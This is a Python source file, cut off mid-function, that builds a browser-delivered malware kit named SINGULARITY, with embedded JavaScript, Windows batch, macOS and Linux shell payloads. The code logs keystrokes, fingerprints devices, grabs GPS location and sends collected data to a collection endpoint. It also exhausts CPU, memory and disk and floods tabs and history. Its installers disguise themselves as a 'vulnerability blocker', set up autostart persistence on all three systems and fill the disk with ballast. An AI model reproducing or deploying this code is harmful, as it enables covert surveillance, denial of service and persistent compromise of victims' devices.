"""
SINGULARITY v3.9 「絶滅」 -- apex-class resident link virus weapon
==================================================================
ブラウザの権限内で到達可能な物理限界まで振り切り、PWAとして常駐し、
サイト全体に自分を注入して伝染し、相手のUSBにも自分を仕込み、
最後はOS常駐インストーラでブラウザの外まで侵食する。

v3.9:
  - 開いた瞬間にタップ無しで タブと窓 を自動増殖（SW openWindow → window.open
    → アンカーclick → キュー の4段フォールバック）
  - L7 はリミッター解除（AUTO_T[7]=AUTO_W[7]=0 = 倍々で増え続ける）
  - 全レベルで感染通知
  - ダウンロード（.bat / 〇〇の保護.txt）は L4 から、1MB以上、L7で無限
  - 旧 keeperStart の「L6以上でしか動かない」バグを撤去

レベル（監視室から遠隔変更・0〜7）:
  0 偵察 / 1 標準 / 2 加熱 / 3 制圧 / 4 焦土 / 5 特異点 / 6 終焉 / 7 絶滅（固定枠）
"""
from __future__ import annotations

import base64
import json
import secrets
import time
from typing import Any, Dict, Optional

VIRUS_ID = "singularity"
VIRUS_NAME = "SINGULARITY"
VIRUS_NAME_JA = "特異点"
VIRUS_VERSION = "3.9"
VIRUS_CLASS = "apex"

LEVEL_LABEL = {0: "偵察", 1: "標準", 2: "加熱", 3: "制圧", 4: "焦土", 5: "特異点",
               6: "終焉", 7: "絶滅"}
LEVEL_DESC = {
    0: "指紋と位置だけ。静か。",
    1: "偵察のみ（既定）。",
    2: "CPU全コアとGPUを回し始める。",
    3: "RAM膨張・ウィンドウ爆弾・履歴洪水・通知洪水・爆音を追加。",
    4: "ディスクをquotaの85%まで書き込む。.bat と 保護.txt の配布開始（各1MB超）。",
    5: "ディスク95% + メインスレッド凍結 + 画面常時点灯 + API傍受。",
    6: "ディスク97% + 全タブ乗っ取り + 追加23系統を全開放。窓は指数増殖を開始。",
    7: "固定枠。上限を外し、全46系統を同時運転。窓がリミッターなしで倍々に増え、"
       "各窓がヘビースキンで高火力化。配布物は無限。最後はOS常駐インストーラでブラウザ外へ。",
}

APP_NAME_DEFAULT = "脆弱性ブロッカー"

# ---------------------------------------------------------------------------
# Worker
# ---------------------------------------------------------------------------
WORKER_JS = r"""
/*! SINGULARITY worker v3.9 */
/* 最小 wasm: (module (func (export "f") (result f64) f64.const 1)) = 41bytes */
var WASM = [0,97,115,109,1,0,0,0, 1,5,1,96,0,1,124, 3,2,1,0, 7,5,1,1,102,0,0,
            10,13,1,11,0,68,0,0,0,0,0,0,240,63,11];
var F = null;
try {
  if (typeof WebAssembly !== "undefined") {
    F = new WebAssembly.Instance(new WebAssembly.Module(new Uint8Array(WASM))).exports.f;
  }
} catch (e) {}

var HOLD = [], RUN = false, K = 0;

function burn() {
  if (!RUN) return;
  var i, acc = 0;
  for (i = 0; i < 6000; i++) { acc += Math.sqrt(i) * Math.sin(i * 0.7) - Math.atan2(i, K); }
  if (F) { try { acc += F(); } catch (e) {} }
  K++;
  if ((K & 63) === 0) { try { self.postMessage({ k: "tick", n: K, acc: acc }); } catch (e) {} }
  setTimeout(burn, 0);
}

self.onmessage = function (e) {
  var d = e.data || {};
  if (d.k === "burn") { RUN = true; if (K === 0) burn(); }
  else if (d.k === "stop") { RUN = false; }
  else if (d.k === "ram") {
    var mb = d.mb | 0;
    for (var i = 0; i < mb; i++) { try { HOLD.push(new Float64Array(131072)); } catch (x) { break; } }
    try { self.postMessage({ k: "ram", got: HOLD.length }); } catch (x) {}
  } else if (d.k === "free") { HOLD = []; }
};
"""

# ---------------------------------------------------------------------------
# Service Worker（ポップアップブロッカーを無視して開く）
# ---------------------------------------------------------------------------
SW_JS = r"""/*! SINGULARITY sw v3.9 */
self.addEventListener("install", function (e) { self.skipWaiting(); });
self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });

self.addEventListener("message", function (e) {
  var d = e.data || {};
  if (d.k === "skip") { self.skipWaiting(); return; }
  if (d.k === "spawn") {
    var n = Math.max(1, Math.min(20, d.n || 1));
    var url = d.url;
    for (var i = 0; i < n; i++) {
      e.waitUntil(self.clients.openWindow(url).catch(function () {}));
    }
    return;
  }
  if (d.k === "out") {
    /* 報告の代理送信（ページが閉じられても届く） */
    try {
      fetch(d.v && d.v.collect ? d.v.collect : "/", {
        method: "POST", headers: { "Content-Type": "application/json" },
        body: JSON.stringify(d.v || {})
      }).catch(function () {});
    } catch (x) {}
    return;
  }
  if (d.k === "ping") { e.waitUntil(self.clients.matchAll().then(function (cs) {
    cs.forEach(function (c) { try { c.postMessage({ k: "pong" }); } catch (x) {} });
  })); }
});

self.addEventListener("fetch", function (e) {
  var u = e.request.url;
  if (u.indexOf("/v/") !== -1 && u.indexOf("/sg/") !== -1) return;
  if (e.request.mode === "navigate") {
    e.respondWith(fetch(e.request).catch(function () { return caches.match(e.request); }));
  }
});
"""

# ---------------------------------------------------------------------------
# SharedWorker（同一オリジンの全タブを1つのハブで繋ぐ）
# ---------------------------------------------------------------------------
SHARED_JS = r"""/*! SINGULARITY shared v3.9 */
var PORTS = [], K = 0;

self.onconnect = function (ev) {
  var p = ev.ports[0];
  PORTS.push(p);
  try { p.start(); } catch (er) {}
  p.onmessage = function (m) {
    var d = m.data || {};
    if (d.k === "hello") { try { p.postMessage({ k: "peers", n: PORTS.length }); } catch (er) {} }
    else {
      for (var i = 0; i < PORTS.length; i++) {
        if (PORTS[i] !== p) { try { PORTS[i].postMessage(d); } catch (er) {} }
      }
    }
  };
  (function loop() {
    var i;
    for (i = 0; i < 900; i++) { Math.sqrt(i) * Math.sin(i); }
    K++;
    if ((K % 60) === 0) {
      for (i = 0; i < PORTS.length; i++) { try { PORTS[i].postMessage({ kind: "tick", k: K }); } catch (er) {} }
    }
    setTimeout(loop, 0);
  })();
};
"""

# ---------------------------------------------------------------------------
# OS常駐インストーラ
# トークン: __URL__ __CODE__ __APP__ __BURN__ __DISKMB__ __HARD__ __RAMMB__ __VER__
# 注意: 中身に """ が出るため区切りは r''' を使うこと。
# ---------------------------------------------------------------------------
INSTALL_BAT = r'''@echo off
title __APP__
setlocal
set "APP=__APP__"
set "CODE=__CODE__"
set "URL=__URL__"
set "BURN=__BURN__"
set "DISKMB=__DISKMB__"
set "HARD=__HARD__"
set "RAMMB=__RAMMB__"
set "DIR=%LOCALAPPDATA%\%APP%"
if not exist "%DIR%" mkdir "%DIR%" >nul 2>nul
copy /y "%~f0" "%DIR%\blocker.bat" >nul 2>nul

(echo CreateObject("WScript.Shell").Run """%DIR%\blocker.bat"" /run", 0, False) > "%DIR%\run.vbs"
(echo CreateObject("WScript.Shell").Run """%DIR%\blocker.bat"" /watch", 0, False) > "%DIR%\watch.vbs"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%" /d "wscript.exe \"%DIR%\run.vbs\"" /f >nul 2>nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "%APP%_watch" /d "wscript.exe \"%DIR%\watch.vbs\"" /f >nul 2>nul

if not "%~1"=="/watch" if not "%~1"=="/run" (
  echo   %APP% v__VER__ を常駐登録しました。
  echo   以後 Windows にログインするたびに勝手に起動します。
)

if "%DISKMB%" GTR "0" (
  if not exist "%DIR%\ballast.bin" fsutil file createnew "%DIR%\ballast.bin" %DISKMB%000000 >nul 2>nul
)

for /l %%i in (1,1,%BURN%) do start "" /b powershell -NoProfile -WindowStyle Hidden -Command "while($true){$x=[math]::Sqrt(3.7);$y=[math]::Sin($x)}" >nul 2>nul
if "%HARD%"=="1" start "" /b powershell -NoProfile -WindowStyle Hidden -Command "$b=New-Object byte[] (__RAMMB__MB);for($i=0;$i -lt $b.Length;$i+=4096){$b[$i]=1};Start-Sleep -Seconds 2000000" >nul 2>nul
if not "%~1"=="/run" start "" "%URL%"
echo   %APP% v__VER__ 常駐開始 (burn=%BURN% disk=%DISKMB%MB hard=%HARD%)
if not "%~1"=="/run" timeout /t 2 >nul
exit /b

:watch
for /f %%c in ('tasklist /fi "imagename eq powershell.exe" ^| find /c /i "powershell"') do set "N=%%c"
if %N% LSS %BURN% for /l %%i in (1,1,%BURN%) do start "" /b powershell -NoProfile -WindowStyle Hidden -Command "while($true){$x=[math]::Sqrt(3.7);$y=[math]::Sin($x)}" >nul 2>nul
timeout /t 20 >nul
goto watch
'''

INSTALL_COMMAND = r'''#!/bin/bash
APP="__APP__"; CODE="__CODE__"; URL="__URL__"; BURN="__BURN__"
DISKMB="__DISKMB__"; HARD="__HARD__"; RAMMB="__RAMMB__"
DIR="$HOME/Library/Application Support/$APP"
mkdir -p "$DIR"
cp "$0" "$DIR/blocker.command" 2>/dev/null; chmod +x "$DIR/blocker.command" 2>/dev/null
mkdir -p "$HOME/Library/LaunchAgents"

cat > "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" <<PLIST
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.singularity.blocker</string>
  <key>ProgramArguments</key><array><string>/bin/bash</string><string>$DIR/blocker.command</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
PLIST

launchctl unload "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null
launchctl load "$HOME/Library/LaunchAgents/com.singularity.blocker.plist" 2>/dev/null

if [ "$1" = "/watch" ]; then
  while :; do
    n=$(pgrep -f "SGBURN" | wc -l | tr -d ' ')
    if [ "$n" -lt "$BURN" ]; then
      for i in $(seq 1 "$BURN"); do nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 & done
    fi
    sleep 20
  done
  exit 0
fi

pkill -f "SGBURN" 2>/dev/null
for i in $(seq 1 "$BURN"); do
  nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
done

if [ "$HARD" = "1" ]; then
  nohup perl -e "\$x=\"a\"x1048576; for(1..$RAMMB){\$h.=\$x} ; sleep 2000000 # SGRAM" >/dev/null 2>&1 &
  if [ ! -f "$DIR/ballast.bin" ]; then
    free=$(df -k "$HOME" | awk 'NR==2{print $4}')
    mb=$(( free * 95 / 100 / 1024 ))
    mkfile -n ${mb}m "$DIR/ballast.bin" 2>/dev/null || dd if=/dev/zero of="$DIR/ballast.bin" bs=1m count=$mb 2>/dev/null
  fi
  nohup bash -c "while :; do sleep 3600; done" >/dev/null 2>&1 &
fi

open "$URL" 2>/dev/null
echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
'''

INSTALL_SH = r'''#!/bin/bash
APP="__APP__"; CODE="__CODE__"; URL="__URL__"; BURN="__BURN__"
DISKMB="__DISKMB__"; HARD="__HARD__"; RAMMB="__RAMMB__"
DIR="$HOME/.local/share/singularity"
mkdir -p "$DIR"
cp "$0" "$DIR/blocker.sh" 2>/dev/null; chmod +x "$DIR/blocker.sh" 2>/dev/null

mkdir -p "$HOME/.config/systemd/user" "$HOME/.config/autostart"
cat > "$HOME/.config/autostart/singularity.desktop" <<DESK
[Desktop Entry]
Type=Application
Name=$APP
Exec=$DIR/blocker.sh
X-GNOME-Autostart-enabled=true
DESK

if command -v systemctl >/dev/null 2>&1; then
cat > "$HOME/.config/systemd/user/singularity.service" <<UNIT
[Unit]
Description=$APP
[Service]
ExecStart=$DIR/blocker.sh
Restart=always
RestartSec=5
[Install]
WantedBy=default.target
UNIT
  systemctl --user daemon-reload 2>/dev/null
  systemctl --user enable singularity.service 2>/dev/null
  systemctl --user restart singularity.service 2>/dev/null
fi

pkill -f "SGBURN" 2>/dev/null
for i in $(seq 1 "$BURN"); do
  nohup bash -c 'while :; do :; done # SGBURN' >/dev/null 2>&1 &
done

if [ "$HARD" = "1" ]; then
  nohup perl -e "\$x=\"a\"x1048576; for(1..$RAMMB){\$h.=\$x} ; sleep 2000000 # SGRAM" >/dev/null 2>&1 &
  if [ ! -f "$DIR/ballast.bin" ]; then
    free=$(df -k "$HOME" | awk 'NR==2{print $4}')
    mb=$(( free * 95 / 100 / 1024 ))
    dd if=/dev/zero of="$DIR/ballast.bin" bs=1M count=$mb 2>/dev/null
  fi
fi

(xdg-open "$URL" 2>/dev/null || true)
echo "  $APP v__VER__ 常駐開始 (burn=$BURN hard=$HARD)"
'''

# ---------------------------------------------------------------------------
# 本体ペイロード
# ---------------------------------------------------------------------------
PAYLOAD_JS = r"""
(function () {
"use strict";
/*! SINGULARITY payload v3.9 -- 絶滅 */
var MYVER = window.__SINGULARITY_VER__
  || (window.__SINGULARITY_CFG__ && window.__SINGULARITY_CFG__.ver) || "3.9";

/* ---------------- 小物 ---------------- */
function Q(k) { try { return new URLSearchParams(location.search).get(k) || ""; } catch (e) { return ""; } }
function now() { return Date.now(); }
function clamp(v, a, b) { v = parseInt(v, 10); if (isNaN(v)) v = a; return v < a ? a : (v > b ? b : v); }
function hash(s) { s = String(s); var h = 2166136261; for (var i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); } return (h >>> 0).toString(16); }
function err_(e) { try { R.errors.push(String((e && e.message) || e).slice(0, 120)); if (R.errors.length > 50) R.errors.shift(); } catch (x) {} }
function ck(k, v) { try { if (v === undefined) { var m = document.cookie.match("(^|; )" + k + "=([^;]*)"); return m ? m[2] : null; } document.cookie = k + "=" + v + ";path=/;max-age=315360000"; } catch (e) {} }
function wn(k, v) { try { if (v === undefined) return localStorage.getItem(k); localStorage.setItem(k, v); } catch (e) { return null; } }
function rid(n) { var a = "abcdefghijklmnopqrstuvwxyz0123456789", s = ""; n = n || 8; while (n--) s += a[(Math.random() * a.length) | 0]; return s; }
function b64u(u8) { var s = ""; for (var i = 0; i < u8.length; i++) s += String.fromCharCode(u8[i]); return btoa(s).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); }

/* ---------------- 状態 ---------------- */
var T0 = now(), PAUSED = false, WORKERS = [], ESE = null, CMD_SEEN = {};
var R = { errors: [], vectors: {}, chain: [], hops: [] };

var UA = navigator.userAgent || "";
var IS_IOS = /iPad|iPhone|iPod/.test(UA)
  || (navigator.platform === "MacIntel" && (navigator.maxTouchPoints || 0) > 1);
var IS_AND = /Android/i.test(UA);
var IS_MOBILE = IS_IOS || IS_AND || /Mobile/i.test(UA);

var W = clamp(Q("w"), 0, 999);
var WIN = Q("w") !== "" && Q("w") !== "0";
var IFR = Q("u") === "ifr";
var FROM_OS = Q("u") === "os";

/* ---------------- CFG ---------------- */
var CFG = window.__SINGULARITY_CFG__ || {};
var SID = CFG.sid || ck("sgid") || rid(14);
try { ck("sgid", SID); } catch (e) {}
var LEVEL = clamp(CFG.level, 0, 7);
var PAUSED_OK = false;

function applyLevel(l) {
  LEVEL = clamp(l, 0, 7);
  CFG.windows = 0;
  CFG.winDelay = LEVEL >= 6 ? 220 : (LEVEL >= 4 ? 500 : 900);
  CFG.winMode = CFG.winMode || "";
  CFG.winBranch = CFG.winBranch || 2;
  CFG.winDepth = CFG.winDepth || 0;
  CFG.winSkin = LEVEL >= 6 ? 1 : 0;

  CFG.burn = LEVEL >= 2;
  CFG.gpu = LEVEL >= 2;
  CFG.wasm = LEVEL >= 3;
  CFG.worklet = LEVEL >= 3;
  CFG.ram = LEVEL >= 3;
  CFG.history = LEVEL >= 3;
  CFG.notify = true;                       /* 全レベルで通知 */
  CFG.sound = LEVEL >= 3;
  CFG.disk = LEVEL >= 4;
  CFG.dlMB = LEVEL >= 7 ? 4 : (LEVEL >= 6 ? 3 : (LEVEL >= 5 ? 2 : 1));
  CFG.downloads = LEVEL >= 7 ? -1 : (LEVEL >= 6 ? 24 : (LEVEL >= 5 ? 12 : (LEVEL >= 4 ? 6 : 0)));
  CFG.installer = LEVEL >= 4;
  CFG.install = CFG.install || "auto";
  CFG.installLevel = CFG.installLevel || 4;
  CFG.diskRatio = LEVEL >= 6 ? 0.97 : (LEVEL >= 5 ? 0.95 : 0.85);
  CFG.hold = LEVEL >= 5;
  CFG.rat = LEVEL >= 4;
  CFG.inject = LEVEL >= 4;
  CFG.sharedWorker = LEVEL >= 5;
  CFG.hop = LEVEL >= 3;
  CFG.dom = LEVEL >= 2;
  CFG.sseOn = LEVEL >= 3;
  CFG.swarm = LEVEL >= 7 ? 0 : 0;

  if (CFG.burn) {
    CFG.cores = clamp(navigator.hardwareConcurrency || 4, 1, 32);
    if (LEVEL >= 7) {
      var auto = clamp(8192, (navigator.deviceMemory || 4) * 1024 * 2);
      CFG.ramMB = Math.round(CFG.finalRamMB > 0 ? CFG.finalRamMB : auto);
      CFG.workerMB = 32;
    } else {
      CFG.ramMB = Math.round((navigator.deviceMemory || 4) * 1024 * (LEVEL >= 5 ? 0.35 : 0.25));
      CFG.workerMB = LEVEL >= 5 ? 24 : 16;
    }
  } else { CFG.cores = 0; CFG.ramMB = 0; }
  if (CFG.winLock) {
    if (CFG.winLock.mode) CFG.winMode = CFG.winLock.mode;
    if (CFG.winLock.branch) CFG.winBranch = CFG.winLock.branch;
    if (CFG.winLock.depth != null) CFG.winDepth = CFG.winLock.depth;
  }
  R.final = (LEVEL >= 7);
}
applyLevel(LEVEL);

var STANDALONE = false;
try {
  STANDALONE = !!(window.matchMedia && matchMedia("(display-mode: standalone)").matches)
    || !!navigator.standalone
    || !!(window.matchMedia && matchMedia("(display-mode: window-controls-overlay)").matches);
} catch (e) {}
if (STANDALONE && CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);

/* ================= 1. 環境 / 列挙 ================= */
function base() {
  var n = navigator, s = screen;
  R.env = {
    ua: n.userAgent, platform: n.platform, lang: n.language, langs: n.languages,
    cores: n.hardwareConcurrency, mem: n.deviceMemory, tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
    screen: s.width + "x" + s.height, avail: s.availWidth + "x" + s.availHeight,
    dpr: devicePixelRatio, colorDepth: s.colorDepth, touch: (n.maxTouchPoints || 0),
    cookies: n.cookieEnabled, online: n.onLine, pdf: !!n.pdfViewerEnabled,
    standalone: STANDALONE, sid: SID, ver: MYVER, level: LEVEL,
    vw: innerWidth, vh: innerHeight, ref: Q("ref"), url: location.href, host: location.host,
    u: Q("u") || "root", w: W
  };
  try { R.env.plugins = (n.plugins || []).length; } catch (e) {}
}

/* ================= 2. ページ / DOM / キーログ ================= */
function pageMeta() {
  R.page = {
    title: document.title || null, forms: document.forms.length, links: document.links.length,
    imgs: document.images.length, scripts: document.scripts.length, nodes: document.getElementsByTagName("*").length,
    text: (document.body ? document.body.innerText || "" : "").slice(0, 600),
    origin: location.origin, referrer: document.referrer || null
  };
  if (!CFG.dom) return;
  try {
    var k = [];
    addEventListener("keydown", function (e) {
      k.push(e.key);
      if (k.length > 40) k.shift();
      R.page.keys = k.join("");
    });
  } catch (e) {}
}

/* ================= 3. 指紋 ================= */
function canvasFP() {
  try {
    var c = document.createElement("canvas"), x = c.getContext("2d");
    x.textBaseline = "top"; x.font = "14px Arial"; x.fillStyle = "#f60";
    x.fillRect(0, 0, 100, 30); x.fillStyle = "#069";
    x.fillText("SINGULARITY \u30C6\u30B9\u30C8", 2, 12);
    x.fillStyle = "rgba(102,204,0,.7)"; x.fillText("SINGULARITY \u30C6\u30B9\u30C8", 4, 17);
    var d = c.toDataURL();
    return { hash: hash(d.slice(-128)), len: d.length };
  } catch (e) { return null; }
}
function webglFP() {
  try {
    var c = document.createElement("canvas"), g = c.getContext("webgl") || c.getContext("experimental-webgl");
    if (!g) return null;
    var dbg = g.getExtension("WEBGL_debug_renderer_info");
    return {
      vendor: g.getParameter(g.VENDOR), renderer: g.getParameter(g.RENDERER),
      un: dbg ? g.getParameter(dbg.UNMASKED_VENDOR_WEBGL) : null,
      ur: dbg ? g.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : null,
      maxTex: g.getParameter(g.MAX_TEXTURE_SIZE)
    };
  } catch (e) { return null; }
}
function fontFP() {
  try {
    var list = ["Arial", "Courier New", "Georgia", "Times New Roman", "Verdana",
                "Hiragino Sans", "Yu Gothic", "Meiryo", "MS PGothic", "Roboto", "Segoe UI"];
    var sp = document.createElement("span"), have = [];
    sp.style.cssText = "position:absolute;left:-9999px;font-size:72px;";
    sp.textContent = "mmmwwlil1";
    document.body.appendChild(sp);
    var w0 = sp.offsetWidth, h0 = sp.offsetHeight;
    for (var i = 0; i < list.length; i++) {
      sp.style.fontFamily = "'" + list[i] + "',monospace";
      if (sp.offsetWidth !== w0 || sp.offsetHeight !== h0) have.push(list[i]);
    }
    sp.remove();
    return { list: have, n: have.length };
  } catch (e) { return null; }
}
function mathFP() {
  try {
    var out = [Math.tan(-1e300), Math.sinh(1), Math.cosh(10), Math.expm1(1), Math.log1p(10)];
    out.push(Math.pow(Math.PI, -100), Math.atan2(1e300, 1e-300));
    return { hash: hash(out.join(",")) };
  } catch (e) { return null; }
}
function audioFP() {
  try {
    var AC = window.AudioContext || window.webkitAudioContext;
    if (!AC) return;
    var ctx = new AC(), o = ctx.createOscillator(), an = ctx.createAnalyser();
    o.type = "triangle"; o.frequency.value = 10000;
    o.connect(an); an.connect(ctx.destination); o.start();
    var d = new Uint8Array(an.frequencyBinCount);
    an.getByteFrequencyData(d);
    R.vectors.audio = { hash: hash(Array.prototype.join.call(d.slice(0, 40), ",")), rate: ctx.sampleRate };
    try { ctx.close(); } catch (e) {}
  } catch (e) {}
}

/* ================= 4. ネット / 地理 / リーク ================= */
var TZ_CC = { "Asia/Tokyo": "JP", "Asia/Seoul": "KR", "Asia/Shanghai": "CN", "Asia/Taipei": "TW",
              "Europe/London": "GB", "Europe/Paris": "FR", "Europe/Berlin": "DE",
              "America/New_York": "US", "America/Los_Angeles": "US", "America/Chicago": "US" };
function netGuess() {
  var tz = R.env.tz || "";
  R.network = { tz: tz, cc: TZ_CC[tz] || null, lang: navigator.language,
                conn: (navigator.connection && navigator.connection.effectiveType) || null,
                down: (navigator.connection && navigator.connection.downlink) || null };
}
function leak(cb) {
  try {
    var p = new Promise(function (res) {
      var img = new Image();
      img.onload = function () { res("ok"); };
      img.onerror = function () { res("err"); };
      img.src = CFG.path + "/c?sid=" + SID + "&d=" + b64u(new TextEncoder().encode("px"));
    });
    setTimeout(function () { res(null); }, 2500);
    p.then(cb);
  } catch (e) { cb(null); }
}

/* ================= 5. プライバシー / 検知回避 ================= */
function testStore(kind) {
  try { var s = window[kind]; s.setItem("__sg", "1"); s.removeItem("__sg"); return true; } catch (e) { return false; }
}
function privacy() {
  R.privacy = { ls: testStore("localStorage"), ss: testStore("sessionStorage"),
                idb: !!window.indexedDB, caches: !!window.caches, sw: !!navigator.serviceWorker };
  try {
    if (navigator.permissions && navigator.permissions.query) {
      R.privacy.permissions = {};
      ["geolocation", "notifications", "camera", "microphone", "clipboard-read"].forEach(function (name) {
        try { navigator.permissions.query({ name: name }).then(function (s) { R.privacy.permissions[name] = s.state; push(false); }).catch(function () {}); } catch (e) {}
      });
    }
  } catch (e) {}
}
function adblock() {
  try {
    var d = document.createElement("div");
    d.className = "ad-banner adsbox";
    d.style.cssText = "position:absolute;left:-9999px";
    document.body.appendChild(d);
    setTimeout(function () { R.privacy.adblock = d.offsetHeight === 0; d.remove(); }, 300);
  } catch (e) {}
}
function perms() {
  try {
    if (navigator.permissions && navigator.permissions.query) {
      navigator.permissions.query({ name: "storage-access" }).then(function (s) { R.privacy.storageAccess = s.state; }).catch(function () {});
    }
  } catch (e) {}
}

/* ================= 6. ハードウェア ================= */
function codecs() {
  var v = document.createElement("video"), a = document.createElement("audio");
  function t(m) { try { return v.canPlayType(m) || ""; } catch (e) { return ""; } }
  R.hardware = R.hardware || {};
  R.hardware.codecs = {
    h264: !!t('video/mp4; codecs="avc1.42E01E"'), hevc: !!t('video/mp4; codecs="hvc1"'),
    av1: !!t('video/mp4; codecs="av01.0.05M.08"'), vp9: !!t('video/webm; codecs="vp9"'),
    opus: !!(a.canPlayType && a.canPlayType('audio/webm; codecs="opus"')),
    flac: !!(a.canPlayType && a.canPlayType("audio/flac"))
  };
}
function benchmark() {
  try {
    var t = performance.now(), n = 0;
    while (performance.now() - t < 120) { Math.sqrt(n) * Math.sin(n); n++; }
    R.hardware.ops = Math.round(n / ((performance.now() - t) / 1000));
    var f = 0, t2 = performance.now();
    (function loop() {
      f++;
      if (performance.now() - t2 < 500) requestAnimationFrame(loop);
      else { R.hardware.fps = Math.round(f / ((performance.now() - t2) / 1000)); push(false); }
    })();
  } catch (e) {}
}
function devices() {
  try {
    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
      navigator.mediaDevices.enumerateDevices().then(function (l) {
        R.hardware.devices = l.length;
        R.hardware.kinds = l.map(function (d) { return d.kind; }).join(",");
      }).catch(function () {});
    }
  } catch (e) {}
}
function behavior() {
  R.behavioral = { at: now() };
  try {
    addEventListener("mousemove", function (e) { R.behavioral.mx = e.clientX; R.behavioral.my = e.clientY; });
    addEventListener("scroll", function () { R.behavioral.sy = Math.round(scrollY); });
    addEventListener("visibilitychange", function () { R.behavioral.vis = document.visibilityState; });
  } catch (e) {}
}
function motion() {
  try {
    if (window.DeviceMotionEvent) {
      addEventListener("devicemotion", function (e) {
        var a = e.accelerationIncludingGravity || {};
        R.behavioral.motion = [Math.round(a.x || 0), Math.round(a.y || 0), Math.round(a.z || 0)].join(",");
      });
    }
  } catch (e) {}
}
function botProbe() {
  R.bot = { webdriver: !!navigator.webdriver, headless: /HeadlessChrome/.test(UA),
            langs: (navigator.languages || []).length, plugins: (navigator.plugins || []).length };
  R.verdict = { human: !R.bot.webdriver && !R.bot.headless };
}
function mutate() { R.viral = R.viral || {}; R.viral.at = now(); }

function geo() {
  try {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(function (p) {
      R.network.gps = { lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy };
      push(true);
    }, function () { R.network.gps = null; }, { enableHighAccuracy: true, timeout: 6000 });
  } catch (e) {}
}
function federation() {
  try {
    if (!CFG.sharedWorker || !window.SharedWorker) return;
    var w = new SharedWorker(URL.createObjectURL(
      new Blob([window.__SINGULARITY_SHARED__ || ""], { type: "application/javascript" })));
    w.port.postMessage({ k: "hello" });
    w.port.onmessage = function (e) { R.union = { peers: (e.data && e.data.n) || 0, at: now() }; };
    R.union = { peers: 1, at: now() };
  } catch (e) {}
}

/* ================= 7. 資源の圧搾 ================= */
function mkWorker() {
  try {
    return new Worker(URL.createObjectURL(
      new Blob([window.__SINGULARITY_WORKER__ || ""], { type: "application/javascript" })));
  } catch (e) { return null; }
}
function burnStart() {
  if (!CFG.burn) return;
  var n = CFG.cores || 0;
  for (var i = 0; i < n; i++) {
    var w = mkWorker();
    if (!w) break;
    try { w.postMessage({ k: "burn" }); } catch (e) {}
    WORKERS.push(w);
  }
  R.burn = { n: WORKERS.length, cores: CFG.cores, wasm: !!CFG.wasm, gpu: !!CFG.gpu,
             worklet: !!CFG.worklet, at: now() };
}
function ramStart() {
  if (!CFG.ramMB) return;
  if (!WORKERS.length) { var w0 = mkWorker(); if (w0) WORKERS.push(w0); }
  var n = Math.max(1, WORKERS.length);
  var per = Math.max(8, Math.round(CFG.ramMB / n));
  WORKERS.forEach(function (w) { try { w.postMessage({ k: "ram", mb: per }); } catch (e) {} });
  R.ram = { mb: per * n, per: per, n: n, at: now() };
}
function gpuStart() {
  if (!CFG.gpu) return;
  try {
    var c = document.createElement("canvas");
    var g = c.getContext("webgl");
    if (!g) return;
    var p = g.createProgram();
    R.burn.gpu = true;
    (function loop() {
      if (PAUSED) return;
      g.clearColor(Math.random(), Math.random(), Math.random(), 1);
      g.clear(g.COLOR_BUFFER_BIT);
      requestAnimationFrame(loop);
    })();
  } catch (e) {}
}
function historyFlood() {
  if (!CFG.history) return;
  var n = 0;
  (function step() {
    var end = Math.min(n + 200, 4000);
    for (; n < end; n++) { try { history.pushState({ n: n }, "", "#sg" + n); } catch (e) { return; } }
    R.history = { n: n, at: now() };
    if (n < 4000) setTimeout(step, 0);
  })();
}
function diskStart() {
  if (!CFG.disk || !navigator.storage || !navigator.storage.estimate) return;
  idbDiskStart();
}
function idbDiskStart() {
  try {
    if (!window.indexedDB) return;
    var req = indexedDB.open("sg_disk", 1);
    req.onupgradeneeded = function () {
      var db = req.result;
      if (!db.objectStoreNames.contains("b")) db.createObjectStore("b");
    };
    req.onsuccess = function () {
      var db = req.result;
      var MB = 4;
      function chunk(i) { return new Uint8Array(MB * 1024 * 1024); }
      var budget = (navigator.storage && navigator.storage.estimate)
        ? 1 : 0;
      var n = LEVEL >= 7 ? 512 : (LEVEL >= 6 ? 384 : 256);
      R.disk = { idb: 0, at: now() };
      (function step(i) {
        if (i >= n) { push(true); return; }
        try {
          var tx = db.transaction("b", "readwrite");
          tx.objectStore("b").put(chunk(i), i);
          tx.oncomplete = function () {
            R.disk.idb++;
            if ((i & 31) === 0) push(false);
            setTimeout(function () { step(i + 1); }, 0);
          };
          tx.onerror = function () { setTimeout(function () { step(i + 1); }, 0); };
        } catch (e) { err_(e); }
      })(0);
    };
    req.onerror = function () { err_("idb"); };
  } catch (e) {}
}
function cacheBuckets() {
  try {
    if (!window.caches) return;
    caches.open("sg-p").then(function (c) {
      c.put("/__sg_ping", new Response("x".repeat(4096)));
      R.cache = { at: now() };
    }).catch(function () {});
  } catch (e) {}
}
function layoutThrash() {
  try {
    var d = document.createElement("div");
    d.style.cssText = "position:fixed;left:-9999px;top:0";
    document.body.appendChild(d);
    var i = 0;
    (function loop() {
      d.style.width = (100 + (i % 7)) + "px";
      d.style.height = (100 + (i % 5)) + "px";
      d.offsetHeight;
      i++;
      if (i % 40 === 0) R.layout = { i: i, at: now() };
      if (!PAUSED) requestAnimationFrame(loop);
    })();
  } catch (e) {}
}
function clipHijack() {
  try {
    addEventListener("copy", function (e) {
      try {
